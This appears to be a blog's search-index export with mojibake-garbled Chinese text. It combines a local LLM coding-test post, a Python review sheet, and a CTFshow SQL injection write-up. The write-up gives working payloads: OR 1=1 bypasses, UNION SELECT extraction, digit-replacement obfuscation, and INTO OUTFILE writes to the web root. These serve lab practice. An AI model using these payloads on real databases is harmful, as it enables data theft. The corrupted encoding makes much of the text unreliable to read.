token\nè½¬çš„éå¸¸å¿«ï¼Œå°çƒæ²¡æœ‰åœ¨å…­è¾¹å½¢é‡Œé¢ï¼Œä¼šè¢«æ‰“é£å‡ºå»ï¼Œæœ€ååªå‰©ä¸‹ä¸€ä¸ªæ­£åœ¨è½¬çš„å…­è¾¹å½¢ã€‚\nOpenAl\u0026rsquo;s gpt-oss 20B å¯è¿è¡Œâœ” é€šè¿‡âœ” å®Œç¾è¿è¡Œâ­• é€Ÿåº¦âš¡âš¡\n//å¤‡æ³¨ï¼šReasoning Effortä½¿ç”¨ä¸­ç­‰å¼ºåº¦\n9.58 token/s 4030 token\næ­£å¸¸è¿è¡Œï¼Œæ‰“å¼€åå°çƒå¼¹è·³åŸºæœ¬ç¬¦åˆç‰©ç†è§„å¾‹ï¼Œä½†æ˜¯å°çƒæ¥è§¦è¾¹ç¼˜æ—¶è¾¹ç¼˜æ‘©æ“¦åŠ›æœ‰äº›å¼‚å¸¸ï¼Œä½†æ•´ä½“è¡¨ç°ä¸é”™ã€‚\nQwen3-30b Coder å¯è¿è¡Œâœ” é€šè¿‡âœ” å®Œç¾è¿è¡Œâœ” é€Ÿåº¦âš¡âš¡âš¡\n15.28 token/s 1889 token\nè¡¨ç°æœ€å¥½ï¼Œæ¶ˆè€—tokenæ•°æœ€å°‘çš„ä¸€ä¸ªæ¨¡å‹ï¼Œè¿è¡Œè‰¯å¥½ï¼ŒåŸºæœ¬å®Œå…¨ç¬¦åˆç‰©ç†è§„å¾‹\nQwen3-4b 2507 å¯è¿è¡Œâœ” é€šè¿‡âŒ å®Œç¾è¿è¡ŒâŒ é€Ÿåº¦âš¡âš¡âš¡ ï¼ˆthinkingï¼‰ é€Ÿåº¦âš¡\nnonThinking66.20 token/s 2410 token Thinking49.07 token/s 11834 token\nnonThinkingï¼šå°çƒä¸‹è½ï¼Œä½†æ˜¯æ²¡æœ‰åˆ°è¾¹ç¼˜æ—¶æ²¡æœ‰ç¢°æ’ç›´æ¥ç©¿è¿‡å»æ‰å‡ºå±å¹•å¤–\nThinkingï¼šå°çƒå›ºå®šåœ¨ä¸­å¿ƒæ ¹æœ¬ä¸ä¼šä¸‹è½ã€‚\nDeepseek-r1-0528-Qwen3-8b å¯è¿è¡ŒâŒ é€šè¿‡âŒ å®Œç¾è¿è¡ŒâŒ é€Ÿåº¦ğŸ¢ğŸ¢ğŸ¢ğŸ¢ğŸ¢ğŸ¢ğŸ¢ğŸ¢ğŸ¢ğŸ¢ğŸ¢ğŸ¢\n11.61 token/s 23884 token\nå¤ªæ…¢äº†å¤ªæ…¢äº†å¤ªæ…¢äº†ï¼Œæ€è€ƒäº†27åˆ†é’Ÿå•Šå•Šå•Šå•Šå•Š\né¦–å…ˆï¼Œä¸å¾—ä¸æåˆ°ï¼Œè¿™ä¸ªé€Ÿåº¦æ‰£å¤§åˆ†ã€‚æ˜¯åŸºæœ¬ä¸å¯ç”¨çš„çº§åˆ«ï¼Œtokenæ¶ˆè€—æ•°é‡æå¤§ã€‚\nç¬¬äºŒï¼Œä¸çŸ¥é“ä¸ºä»€ä¹ˆä¸€æ¬¡è¾“å‡ºäº†ä¸¤ä¸ªç¨‹åºï¼Œè€Œä¸”éƒ½ä¸å¯ç”¨ï¼Œæ‰“å¼€é—ªé€€/ç›´æ¥æ— æ³•è¿è¡Œã€‚\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 ç¬¬ä¸€ä¸ª File \u0026#34;C:\\Users\\xqb\\Desktop\\1\\1.txt\u0026#34;, line 50 p1 = [vertices[(i+1) % 6][0], vertices[(i+1) % 6] ^ SyntaxError: \u0026#39;[\u0026#39; was never closed ç¬¬äºŒä¸ª C:\\Users\\xqb\\AppData\\Roaming\\Python\\Python313\\site-packages\\pygame\\pkgdata.py:25: UserWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html. The pkg_resources package is slated for removal as early as 2025-11-30. Refrain from using this package or pin to Setuptools\u0026lt;81. from pkg_resources import resource_stream, resource_exists pygame 2.6.1 (SDL 2.28.4, Python 3.13.3) Hello from the pygame community. https://www.pygame.org/contribute.html Traceback (most recent call last): File \u0026#34;C:\\Users\\xqb\\Desktop\\1\\Deepseek-r1-0528-Qwen3-8b Pass@1.py\u0026#34;, line 144, in \u0026lt;module\u0026gt; angle_offset += hexagon_rotation_speed ^^^^^^^^^^^^^^^^^^^^^^ NameError: name \u0026#39;hexagon_rotation_speed\u0026#39; is not defined. Did you mean: \u0026#39;hex_rotation_speed\u0026#39;? liquid/lfm2-1.2b æœ¬æ¨¡å‹ç”±äºå°ºå¯¸æ¯”è¾ƒå°ï¼Œæ•…é‡‡ç”¨æ— é‡åŒ–ç‰ˆæœ¬(F16)\nå¯è¿è¡ŒâŒ é€šè¿‡âŒ å®Œç¾è¿è¡ŒâŒ é€Ÿåº¦âš¡âš¡âš¡âš¡\n83.09 token/s 1519 token\nå°ºå¯¸å¤ªå°ï¼Œèƒ½åŠ›æœ‰é™å¯ä»¥ç†è§£ã€‚\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 C:\\Users\\xqb\\Desktop\\1\u0026gt;py lfm2.py 1.73 0.87 1.31 0.12 0.45 0.10 0.00 0.83 0.40 1.60 1.26 1.64 Traceback (most recent call last): File \u0026#34;C:\\Users\\xqb\\Desktop\\1\\lfm2.py\u0026#34;, line 96, in \u0026lt;module\u0026gt; simulate() ~~~~~~~~^^ File \u0026#34;C:\\Users\\xqb\\Desktop\\1\\lfm2.py\u0026#34;, line 62, in simulate ball_position = (HEXON_WIDTH / 2, HEXON_height - BALL_RADIUS) # Start at top center of the hexagon ^^^^^^^^^^^^ NameError: name \u0026#39;HEXON_height\u0026#39; is not defined google Gemma-3n-e4b å¯è¿è¡ŒâŒ é€šè¿‡âŒ å®Œç¾è¿è¡ŒâŒ é€Ÿåº¦âš¡âš¡âš¡\n34.21 token/s 1878 token\n1 2 3 4 5 6 7 8 9 10 11 C:\\Users\\xqb\\AppData\\Roaming\\Python\\Python313\\site-packages\\pygame\\pkgdata.py:25: UserWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html. The pkg_resources package is slated for removal as early as 2025-11-30. Refrain from using this package or pin to Setuptools\u0026lt;81. from pkg_resources import resource_stream, resource_exists pygame 2.6.1 (SDL 2.28.4, Python 3.13.3) Hello from the pygame community. https://www.pygame.org/contribute.html Traceback (most recent call last): File \u0026#34;C:\\Users\\xqb\\Desktop\\1\\GoogleGemma3n-e4b.py\u0026#34;, line 30, in \u0026lt;module\u0026gt; HEX_POINTS = calculate_hexagon_points(HEX_RADIUS) # Calculate the hexagon vertices once File \u0026#34;C:\\Users\\xqb\\Desktop\\1\\GoogleGemma3n-e4b.py\u0026#34;, line 27, in calculate_hexagon_points points.append((HEX_CENTER[0] + x, HEX_CENTER[1] + y)) # translate to correct position ~~~~~~~~~~^^^ TypeError: \u0026#39;int\u0026#39; object is not subscriptable ä¸‰ã€æ€»ç»“ æ²¡å•¥å¯æ€»ç»“çš„ï¼Œæœ¬æ¬¡æµ‹å‡ºçš„æœ€å¥½ç”¨çš„ä¸¤ä¸ªæ¨¡å‹ï¼šQwen3-30b Coderå’Œgpt-oss 20Bï¼Œæ•£ä¼š~\næœ¬æ¬¡æµ‹è¯•çš„å…¨éƒ¨æ–‡ä»¶é™„åœ¨è¿™é‡Œäº†\n","date":"2025-09-27T00:00:00Z","permalink":"https://blog.kingbatsoft.top/p/saibodouququaixiaosaiv1/","title":"æœ¬åœ°AIèµ›åšæ–—è›è›-ç¼–ç¨‹ç¯‡"},{"content":"å¤©å¤©æ‘¸é±¼ï¼\nç§»åŠ¨ç«¯è®¿é—®è¿™é‡Œ\r","date":"2025-08-17T00:00:00Z","permalink":"https://blog.kingbatsoft.top/p/bewatermyfriend/","title":"æš‘å‡ç‹ ç‹ æ‘¸é±¼ï¼"},{"content":"CTFSHOW web SQLæ³¨å…¥WriteUP Part1 å‰é¢åšç´¯äº†åšç‚¹ç®€å•çš„ç©ç©ï¼Œå°ç™½ç™½åšçš„èœï¼Œæˆ–è®¸è§£é‡Šçš„ä¸å¯¹ï¼Œå¤§ä½¬è½»å–·QAQ\nWEB171 ç¬¬ä¸€é“é¢˜ï¼Œå¾ˆç®€å•ï¼ŒåŸºæœ¬ä¸Šå°±æ˜¯è€ƒçš„å…¥é—¨åŸºç¡€\n1 2 //æ‹¼æ¥sqlè¯­å¥æŸ¥æ‰¾æŒ‡å®šIDç”¨æˆ· $sql = \u0026#34;select username,password from user where username !=\u0026#39;flag\u0026#39; and id = \u0026#39;\u0026#34;.$_GET[\u0026#39;id\u0026#39;].\u0026#34;\u0026#39; limit 1;\u0026#34;; ç»™äº†æŸ¥è¯¢ä»£ç ï¼Œæ˜¯ç»å…¸çš„sqlæŸ¥è¯¢è¯­å¥\nè¿™é‡Œç®€å•æ‹†ä¸€ä¸‹\n1 2 3 4 5 select username,password --é€‰ä¸­usernameï¼Œpasswordä¸¤è¡Œ from user --ä»userè¡¨ä¸­ where username != \u0026#39;flag\u0026#39; --ä¸é€‰ä¸­usernameé¡¹ä¸ºflagçš„è¡¨ and id = \u0026#39;\u0026#34;.$_GET[\u0026#39;id\u0026#39;].\u0026#34;\u0026#39; --idä¸ºï¼ˆè¿™é‡Œ\u0026#39;\u0026#34;.$_GET[\u0026#39;id\u0026#39;].\u0026#34;\u0026#39;æ˜¯ä¼ å…¥å‚æ•°çš„ç‚¹ï¼‰ limit 1; --é™åˆ¶åªèƒ½æŸ¥è¯¢ä¸€è¡Œ å¾ˆæ˜æ˜¾è¿™é‡Œæ˜¯æœ‰é—®é¢˜çš„ï¼Œå¦‚æœç»™IDä¼ ä¸ª' -- ä¼šæ€ä¹ˆæ ·å‘¢ï¼Ÿ\n1 and id = \u0026#39;\u0026#34;\u0026#39;-- \u0026#34;\u0026#39; limit 1; è¿™é‡Œæ³¨é‡Šç›´æ¥æŠŠåé¢çš„è¯­å¥ç»™å¹²æ‰äº†ï¼Œæˆ‘ä»¬å¯ä»¥ç›´æ¥ä»è¿™é‡Œå…¥æ‰‹ï¼Œç›´æ¥ä¼ ä¸€ä¸ªä¸‡èƒ½å¯†ç 1' or 1=1 -- ç›´æ¥æŠŠæ‰€æœ‰è¡¨çˆ†å‡ºæ¥äº†\n1 2 3 4 5 6 /** âš æ³¨æ„ï¼šè¿™é‡Œç»“å°¾ç”¨çš„â€œ-- â€åé¢æœ‰ä¸ªç©ºæ ¼ã€‚ è™½ç„¶sqlä¸­ `--` æ˜¯æ³¨é‡Šçš„æ„æ€ï¼Œä½†æ˜¯è‡³å°‘åœ¨MYSQLä¸­ï¼Œè¿™ç§æ³¨é‡Šåç›´æ¥è·Ÿè¯­å¥æ˜¯ä¸åˆæ³•çš„ã€‚ æ­¤å¤–ï¼ŒæŸäº›æµè§ˆå™¨å¯èƒ½ä¼šåƒæ‰æœ€åçš„ç©ºæ ¼ï¼Œ å¦‚æœé‡åˆ°è¿™ç§æƒ…å†µï¼Œå¯ä»¥ç”¨+æˆ–è€…%20ç­‰ç­‰æ›¿æ¢æ‰è¿™ä¸ªç©ºæ ¼ï¼Œä¹Ÿå¯ä»¥ç›´æ¥æŠŠ`--+`è¿™ä¸ªè¯­å¥æ¢æˆ%23(urlç¼–ç ï¼š#) **/ å¯æ˜¯å‰é¢æœ‰ä¸€ä¸ªusername !='flag'è¯­å¥ï¼Œä¸ºä»€ä¹ˆä¼šç›´æ¥æŠŠæ‰€æœ‰è¡¨å‡ºäº†å‘¢ï¼Ÿ\nå…¶å®æˆ‘ä»¬ä¼ è¿›å»è¿™ä¸ªä»¥åï¼Œsqlè¯­å¥ç›¸å½“äºå˜æˆäº†è¿™ä¸¤å¥\n1 2 3 select username,password from user where username !=\u0026#39;flag\u0026#39; and id = \u0026#39;\u0026#34;1\u0026#39; or 1=1 --+ \u0026#34;\u0026#39; limit 1; å‰é¢å†™çš„ä¸€æ•´ä¸ªè¯­å¥éƒ½æ²¡ç”¨äº†ï¼Œå› ä¸ºæˆ‘ä»¬ç»™äº†æˆ–çš„æ¡ä»¶ï¼Œæ•´ä¸ªè¡¨ç­‰ä»·æˆäº†è¿™æ ·\n1 where username != \u0026#39;flag\u0026#39; and id = \u0026#39;\u0026#34;1\u0026#39; (or 1=1) andçš„ä¼˜å…ˆçº§æ¯”è¾ƒé«˜ï¼Œæ‰€ä»¥å…ˆåˆ¤æ–­username != 'flag' and id = '\u0026quot;1'ã€‚\n1=1è¢«å•ç‹¬åˆ¤æ–­äº†ï¼Œè€Œä¸”å®ƒæ˜¯æ’çœŸçš„ï¼Œæ‰€ä»¥ç›´æ¥æ‰“å‡ºäº†æ‰€æœ‰çš„è¡¨ã€‚\nWEB172 1 2 3 4 //æ£€æŸ¥ç»“æœæ˜¯å¦æœ‰flag if($row-\u0026gt;username!==\u0026#39;flag\u0026#39;){ $ret[\u0026#39;msg\u0026#39;]=\u0026#39;æŸ¥è¯¢æˆåŠŸ\u0026#39;; } ç°åœ¨ä¸èƒ½ç”¨ä¸Šä¸€é“çš„payloadäº†ï¼Œå› ä¸ºç›´æ¥è¾“å‡ºä¼šæŠŠå’±ä»¬çš„ç»“æœåƒæ‰\næ³¨æ„åˆ°è¿™é‡Œå¯¹ä¼ å…¥å‚æ•°æ²¡æœ‰ä»»ä½•è¿‡æ»¤ï¼Œåªæ˜¯è¿‡æ»¤äº†è¾“å‡ºå€¼ï¼Œäºæ˜¯æˆ‘ä»¬å¯ä»¥ä½¿ç”¨UNIONè”åˆæŸ¥è¯¢æ¥ç»•è¿‡\n1 \u0026#39;1\u0026#39;UNION SELECT 1,password from ctfshow_user2 --+ è¿™é‡Œå› ä¸ºflagå­˜åœ¨passwordé‡Œäº†ï¼Œåªéœ€è¦è·å–passwordä¸­çš„å€¼å°±å¯ä»¥äº†\nè¿™é‡Œè¡¥å……ä¸€äº›ç®€å•å‡½æ•°\n1 2 3 4 database() -- æ•°æ®åº“å group_concat(table_name) --è¡¨å group_concat(column_name)--å­—æ®µå group_concat(xxxxå­—æ®µå) --è·å–å­—æ®µå€¼ WEB173 1 2 3 4 //æ£€æŸ¥ç»“æœæ˜¯å¦æœ‰flag if(!preg_match(\u0026#39;/flag/i\u0026#39;, json_encode($ret))){ $ret[\u0026#39;msg\u0026#39;]=\u0026#39;æŸ¥è¯¢æˆåŠŸ\u0026#39;; } è¿™é‡ŒpayloadåŒä¸Šï¼Œå› ä¸ºflagçš„æ ¼å¼æ˜¯ctfshow{}ï¼Œæ‰€ä»¥å¹¶ä¸å½±å“åšé¢˜ï¼ˆdogeï¼‰\nWEB174 é¦–å…ˆåæ§½ä¸€ä¸‹ï¼Œè¿™é“é¢˜åˆšæ‰“å¼€ä¸Šæ é‡Œçš„æ— è¿‡æ»¤æ³¨å…¥4æ‰“å¼€æ˜¯select-no-waf-3.phpï¼Œä½†æ˜¯çœŸæ­£çš„é¢˜æ˜¯select-no-waf-4.phpï¼Œç»™æˆ‘æŠ˜è…¾äº†ä¸€åœˆ\n1 2 3 4 5 //æ£€æŸ¥ç»“æœæ˜¯å¦æœ‰flag if(!preg_match(\u0026#39;/flag|[0-9]/i\u0026#39;, json_encode($ret))){ $ret[\u0026#39;msg\u0026#39;]=\u0026#39;æŸ¥è¯¢æˆåŠŸ\u0026#39;; } è¿™é‡ŒæŠŠ0-9éƒ½ç»™å¹²æ‰äº†ï¼Œæ€ä¹ˆåŠå‘¢ï¼Ÿ\næœ‰ä¸¤ç§æ–¹æ³•ï¼Œç¬¬ä¸€ç§æ˜¯æ›¿æ¢ï¼Œç¬¬äºŒç§æ˜¯æŠŠç»“æœè¾“å‡ºä¸€ä¸ªæ–‡ä»¶ï¼Œä»è€Œç»•è¿‡è¿‡æ»¤\nç¬¬ä¸€ç§ payload\n1 https://69860b52-d551-457b-99cc-737488724347.challenge.ctf.show/api/v4.php?id=-1%27%20UNION%20SELECT%20REPLACE(username,%27f%27,%27G%27),%20REPLACE(REPLACE(REPLACE(REPLACE(REPLACE(REPLACE(REPLACE(REPLACE(REPLACE(REPLACE(password,%279%27,%27nine%27),%278%27,%27eight%27),%277%27,%27seven%27),%276%27,%27six%27),%275%27,%27five%27),%274%27,%27four%27),%273%27,%27three%27),%272%27,%27two%27),%271%27,%27one%27),%270%27,%27zero%27)%20from%20ctfshow_user4%20--+ è¿™é‡Œåªèƒ½ç”¨jsé‡Œé¢çš„apiæ¥çœ‹ï¼Œç›´æ¥ç”¨å‰ç«¯çš„ä¼šæç¤ºè·å–å¼‚å¸¸\nå¾—åˆ°\n1 {\u0026#34;code\u0026#34;:0,\u0026#34;msg\u0026#34;:\u0026#34;\\u67e5\\u8be2\\u6210\\u529f\u0026#34;,\u0026#34;count\u0026#34;:1,\u0026#34;data\u0026#34;:[{\u0026#34;username\u0026#34;:\u0026#34;admin\u0026#34;,\u0026#34;password\u0026#34;:\u0026#34;admin\u0026#34;},{\u0026#34;username\u0026#34;:\u0026#34;userAUTO\u0026#34;,\u0026#34;password\u0026#34;:\u0026#34;passwordAUTO\u0026#34;},{\u0026#34;username\u0026#34;:\u0026#34;Glag\u0026#34;,\u0026#34;password\u0026#34;:\u0026#34;ctfshow{fefourthreebonethreenine-ceightoned-foureightaf-eightsevenfd-esevenonefoureightcaseventwocfourfive}\u0026#34;}]} æ‰‹åŠ¨æ›¿æ¢æˆ–è€…å†™ä¸ªpythonè„šæœ¬å¯ä»¥å¾—åˆ°æœ€ç»ˆflag\nç¬¬äºŒç§ SQLä¸­ï¼Œinto outputfileå¯ä»¥è¾“å‡ºæ–‡ä»¶ï¼Œ\n1 UNION SELECT username,password from ctfshow_user4 into outfile \u0026#39;/var/www/html/1.txt\u0026#39; -- å‘ç°ä¸å¯ä»¥ç”¨*ä»£æ›¿username,passwordï¼Œä¸çŸ¥é“ä¸ºä»€ä¹ˆï¼Œå¸¦ä½¬å¯ä»¥è§£é‡Šä¸€ä¸‹\nç›´æ¥è®¿é—®1.txtç›´æ¥å¾—åˆ°flag\n","date":"2025-05-30T00:00:00Z","permalink":"https://blog.kingbatsoft.top/p/ctfshow_sql_inject_write_up_1/","title":"CTF_show Web SQLæ³¨å…¥writeup WEB171-WEB180"},{"content":"0xB å†™åœ¨å‰é¢çš„è¯ æœ¬æ–‡æ¡£æ˜¯ Python æ•°æ®åˆ†æè€ƒè¯•çš„å‚è€ƒ/å¤ä¹ èµ„æ–™ï¼Œæ¶µç›– åŸºæœ¬è¯­æ³•ã€å¸¸ç”¨å‡½æ•°ã€ç®€å•ç®—æ³•å®ç° ç­‰å†…å®¹ã€‚\né€‚ç”¨äººç¾¤ï¼šä¸€ç¼–ç¨‹åŸºç¡€çš„åŒå­¦ï¼ˆå¤‡è€ƒï¼‰ çº¯ç²¹æ²¡è¿‡å‡½æ•°çš„æˆ–è€…è‡ªå·±å†™è¿‡çš„è¯·ä¸è¦ç”¨æœ¬æ–‡æ¡£ï¼Œæœ¬æ–‡æ¡£ä¸åŒ…å«è¶³å¤Ÿä¾‹å­ï¼ ä½œè€…ï¼šDanvei233ï¼ˆ@GitHubï¼‰ ç¬¬é›¶ç« æ˜¯åŸºæœ¬è¯­æ³•å’Œçº²è¦ï¼ˆé€ŸæŸ¥ï¼‰ ä½¿ç”¨GPT-o3æ¶¦è‰² 0xD ç›®å½• [TOC]\n0x0 åŸºæœ¬è¯­æ³•ä¸æ•°æ®ç±»å‹ 0.1 å˜é‡ä¸æ•°æ®ç±»å‹æ¦‚è§ˆ åˆ†ç±» å†…ç½®ç±»å‹ å…¸å‹å­—é¢é‡ / èµ‹å€¼ç¤ºä¾‹ æ„é€ å‡½æ•°â€†(å‡½æ•°å¼å†™æ³•) å¸¸è§æ“ä½œ å¤‡æ³¨ æ•°å­— (Numeric) int float complex a = 3 b = 1.2 c = 2+3j int(\u0026quot;42\u0026quot;) float(\u0026quot;3.14\u0026quot;) complex(2,â€¯3) åŠ å‡ä¹˜é™¤ + - * / å¹‚ ** å–æ•´é™¤ // å–ä½™ % bool æœ¬è´¨ä¸Šç»§æ‰¿è‡ª int (True==1, False==0) å¸ƒå°” (Boolean) bool flag = True is_ok = (3 == 1) bool(0) â†’ False é€»è¾‘ä¸ and é€»è¾‘æˆ– or å–å not åªå¯å–å€¼ True/False åºåˆ— (Sequence) str list tuple range s = \u0026quot;hello\u0026quot; s2 = f\u0026quot;{name}\u0026quot; lst = [1, 2, 3] tpl = (1, 2) r = range(0,â€¯5) str(123) list(\u0026quot;abc\u0026quot;) tuple([1,2]) range(5) åˆ‡ç‰‡ [:] æ‹¼æ¥ + æˆå‘˜æµ‹è¯• in é•¿åº¦ len() strã€tupleã€range ä¸å¯å˜ï¼›list å¯å˜ æ˜ å°„ (Mapping) dict d = {\u0026quot;name\u0026quot;: \u0026quot;Bob\u0026quot;, \u0026quot;age\u0026quot;: 18} dict(name=\u0026quot;Bob\u0026quot;, age=18) å–å€¼ d[key] éå† for k,v in d.items() é”®å¿…é¡»å¯å“ˆå¸Œ (hash) ç‰¹æ®Šå•å€¼ NoneType x = None â€” å ä½ã€ç©ºå€¼ åªæœ‰ä¸€ä¸ªå®ä¾‹ None æç¤ºï¼štype(obj) å¯æŸ¥çœ‹å˜é‡å®é™…ç±»å‹ï¼Œisinstance(obj, T) ç”¨äºç±»å‹åˆ¤æ–­ï¼ˆæ¨èï¼‰ï¼Œæ„é€ å‡½æ•°å¯ä»¥ç”¨äºè½¬æ¢ç±»å‹ã€‚\n0.2 å‡½æ•°åŠå…¶ç»“æ„ å‡½æ•°ï¼šå¸¦åå­—çš„å¯å¤ç”¨ä»£ç å—ï¼Œå¯¹è¾“å…¥ï¼ˆå‚æ•°ï¼‰è¿›è¡Œå¤„ç†å¹¶å¯è¿”å›è¾“å‡ºï¼ˆè¿”å›å€¼ï¼‰ã€‚\n0.2.1 å®šä¹‰è¯­æ³• 1 2 3 4 5 def function_name(param1, param2=default): \u0026#34;\u0026#34;\u0026#34;æ–‡æ¡£å­—ç¬¦ä¸²ï¼ˆå¯é€‰ï¼‰\u0026#34;\u0026#34;\u0026#34; # å‡½æ•°ä½“ï¼ˆ4 ä¸ªç©ºæ ¼ç¼©è¿›ï¼‰ ... return value # è¿”å›å€¼å¯çœç•¥ï¼Œç›¸å½“äº return None def å…³é”®å­—åè·Ÿå‡½æ•°åå’Œå‚æ•°åˆ—è¡¨ï¼Œæœ«å°¾å¿…é¡»æœ‰å†’å· :ã€‚ å‡½æ•°ä½“å¿…é¡»ç»Ÿä¸€ç¼©è¿›ï¼ˆæ¨è 4 ä¸ªç©ºæ ¼ï¼‰ã€‚ return æ²¡æœ‰è¡¨è¾¾å¼æ—¶ç­‰ä»·äº return Noneã€‚ 0.2.2 å‡½æ•°å‘½åè§„åˆ™ ä¸ä¸ç°æœ‰æ ‡è¯†ç¬¦é‡å¤ï¼ŒåŒºåˆ†å¤§å°å†™ã€‚ ä»¥å­—æ¯æˆ– _ å¼€å¤´ï¼Œä¸èƒ½ä»¥æ•°å­—å¼€å¤´ï¼Œä¸”ä¸å«ç‰¹æ®Šç¬¦å·ã€‚ æ¨è snake_case æˆ–é©¼å³° camelCaseï¼Œå…³é”®æ˜¯è‡ªæè¿°ã€‚ ä¾‹å¦‚ï¼šis_leap_year(year) ä¸€çœ‹å³çŸ¥å…¶åŠŸèƒ½ä¸è¿”å›å€¼ã€‚ 0.2.3 å‚æ•°ç±»å‹ ä½ç½®å‚æ•°ï¼šè°ƒç”¨æ—¶æŒ‰é¡ºåºä¸€ä¸€å¯¹åº”ã€‚ é»˜è®¤å‚æ•°ï¼šå½¢å‚ä¸­å†™ param=value å¹¶æ”¾åœ¨æœ«å°¾ï¼Œå¯åœ¨è°ƒç”¨æ—¶çœç•¥ã€‚ å¯å˜é•¿åº¦ï¼š*argsã€**kwargsï¼ˆè¿›é˜¶ç”¨æ³•ï¼Œè€ƒè¯•å¯é€‰ï¼‰ã€‚ å‚æ•°åœ¨å‡½æ•°è°ƒç”¨ç»“æŸåå³è¢«é”€æ¯ï¼Œä»…åœ¨å‡½æ•°ä½“å†…éƒ¨å¯è§ã€‚\n0.2.4 è°ƒç”¨å‡½æ•° 1 2 3 4 def is_leap_year(y): return (y % 4 == 0 and y % 100 != 0) or (y % 400 == 0) result = is_leap_year(2024) # è¿”å› True 0.2.5 å˜é‡ä½œç”¨åŸŸ å±€éƒ¨å˜é‡ï¼šåœ¨å‡½æ•°ä½“å†…å£°æ˜ï¼Œåªåœ¨è¯¥å‡½æ•°å†…å¯è§ã€‚ å…¨å±€å˜é‡ï¼šåœ¨å‡½æ•°å¤–éƒ¨å£°æ˜ï¼›è‹¥éœ€åœ¨å‡½æ•°ä¸­ä¿®æ”¹ï¼Œå¿…é¡»ä½¿ç”¨ global å…³é”®å­—ã€‚ 0.3 å¯¹è±¡ï¼ˆclassï¼‰ ä¸€å¥è¯ï¼š ç±»æ˜¯â€œè®¾è®¡å›¾â€ï¼Œå¯¹è±¡æ˜¯æ ¹æ®è®¾è®¡å›¾åšå‡ºçš„â€œå®ç‰©â€ã€‚\n0.3.1 ä»£ç éª¨æ¶ï¼ˆä»ä¸Šåˆ°ä¸‹ä¸€æ¬¡å†™å®Œï¼‰ 1 2 3 4 5 6 7 8 class MyClass: # â‘  class å¼€å¤´ï¼Œå†’å·ä¸èƒ½ä¸¢ common_val = 0 # â‘¡ ç±»å˜é‡ï¼šæ‰€æœ‰å¯¹è±¡å…±ç”¨ def __init__(self, val): # â‘¢ åˆå§‹åŒ–ï¼Œa = MyClass(10) æ—¶è‡ªåŠ¨è°ƒç”¨ self.val = val # self å°±æ˜¯â€œè¿™å°æœºå™¨â€ def method1(self, x): # â‘£ è‡ªå®šä¹‰æ–¹æ³• print(self.val + x) å†™é¡ºåºï¼šclass âœ ç±»å˜é‡ âœ __init__ âœ å…¶ä»– defï¼Œå…¨éƒ¨ 4 ç©ºæ ¼ç¼©è¿›ã€‚\n0.3.2 å®ä¾‹åŒ–ï¼ˆçœŸæœºåˆ°æ‰‹ï¼‰ 1 2 a = MyClass(10) # é€ ä¸€å°å¯¹è±¡ a.method1(5) # è¾“å‡º 15 è®¿é—®å±æ€§ï¼ša.val æˆ– MyClass.common_valã€‚ æ”¹ç±»å˜é‡ï¼šMyClass.common_val = 99 âœ æ‰€æœ‰å¯¹è±¡ä¸€èµ·å˜ã€‚ 0.3.3 é€Ÿè®°è¦ç‚¹ **self** å¿…å†™ï¼šç¼ºäº†ä¼šæŠ¥é”™ missing 1 required positional argument: 'self'ã€‚ ç±»å˜é‡ vs å®ä¾‹å˜é‡ï¼šç±»å˜é‡å¤§å®¶å…±ç”¨ï¼›å®ä¾‹å˜é‡(self.xxx)åªå±äºè‡ªå·±ã€‚ ç§æœ‰/ä¿æŠ¤åï¼š _name å•ä¸‹åˆ’çº¿ï¼šåªæ˜¯æé†’â€œå†…éƒ¨ç”¨â€ã€‚ __name åŒä¸‹åˆ’çº¿ï¼šPython ä¼šæ”¹åæ··æ·†ï¼Œä¸€èˆ¬å¤–éƒ¨è®¿é—®ä¸åˆ°ã€‚ 0.4 åŒ…ï¼ˆpackageï¼‰ ä¸€å¥è¯ï¼š åŒ…å°±æ˜¯æŠŠç›¸å…³åŠŸèƒ½ç»„ç»‡æˆæ–‡ä»¶å¤¹ï¼Œè®©é¡¹ç›®ç»“æ„æ¸…æ™°ã€‚\n0.4.1 åŒ…çš„åŸºæœ¬ç»“æ„ 1 2 3 4 5 6 project_folder/ â”œâ”€ package_name/ # åŒ…ï¼ˆæ–‡ä»¶å¤¹ï¼‰ â”‚ â”œâ”€ __init__.py # æ ‡è®°æ­¤ç›®å½•ä¸ºåŒ…ï¼Œå¯ä¸ºç©º â”‚ â”œâ”€ module1.py # æ¨¡å—ï¼ˆ.py æ–‡ä»¶ï¼‰ â”‚ â””â”€ module2.py â””â”€ main.py # ä½¿ç”¨åŒ…çš„è„šæœ¬ åŒ… (package_name) æ˜¯åŒ…å« __init__.py çš„æ–‡ä»¶å¤¹ã€‚ æ¨¡å— (module1.py) å¯ä»¥å¯¼å…¥ã€è°ƒç”¨å…¶ä¸­çš„å˜é‡ã€å‡½æ•°ã€ç±»ã€‚ 0.4.2 å¯¼å…¥è¯­æ³•ç¤ºä¾‹ 1 2 3 4 5 6 7 import package_name # å¯¼å…¥æ•´ä¸ªåŒ… import package_name.module1 # å¯¼å…¥æ¨¡å— from package_name import module2 # ä»åŒ…é‡Œå¯¼å…¥æ¨¡å— from package_name.module1 import func1 # å¯¼å…¥æ¨¡å—ä¸­çš„å‡½æ•° import package_name as pkg # èµ·åˆ«åï¼Œæ–¹ä¾¿ä¹¦å†™ from package_name.module1 import ClassA as CA æ³¨æ„è¯­æ³•é¡ºåºï¼šå¿…é¡»å†™ä½œ from åŒ…å import åç§°ï¼Œè€Œ **import åç§° from åŒ…å** æ˜¯ä¸åˆæ³•çš„ã€‚ import ... as å¯ä»¥ç»™åŒ…æˆ–æ¨¡å—èµ·ç®€çŸ­åˆ«åã€‚ from ... import ... è®©è°ƒç”¨æ›´ç›´æ¥ï¼ˆæ— éœ€å†™å…¨è·¯å¾„ï¼‰ã€‚ 0.4.3 å¸¸è§ç”¨é€” å°†ä¸åŒåŠŸèƒ½æ‹†åˆ†åˆ°ä¸åŒæ¨¡å—ï¼Œä¿æŒä»£ç æ•´æ´ã€‚ æ–¹ä¾¿å¤šäººåä½œï¼Œæ¯äººç»´æŠ¤ç‹¬ç«‹æ¨¡å—ã€‚ 0.5 æ•°å­—ç±»å‹è®¡ç®— 0.5.1 æ•°å­—ç±»åˆ«å›é¡¾ intï¼šä»»æ„ç²¾åº¦æ•´æ•°ï¼Œå¦‚ 42ã€0b1010ã€‚ 